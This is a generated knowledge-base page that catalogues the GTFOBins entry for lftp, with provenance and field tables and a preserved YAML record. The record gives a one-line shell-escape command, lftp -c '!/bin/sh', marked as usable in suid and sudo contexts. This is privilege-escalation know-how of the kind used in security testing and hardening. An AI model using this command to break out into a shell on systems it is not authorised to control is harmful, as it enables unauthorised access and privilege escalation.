---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [lftp](../../tools/linux/lftp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | lftp |
| name | lftp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/lftp/ |

## Preserved Source Material

```yaml
_body: ''
_name: lftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lftp
functions:
  shell:
  - code: lftp -c '!/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
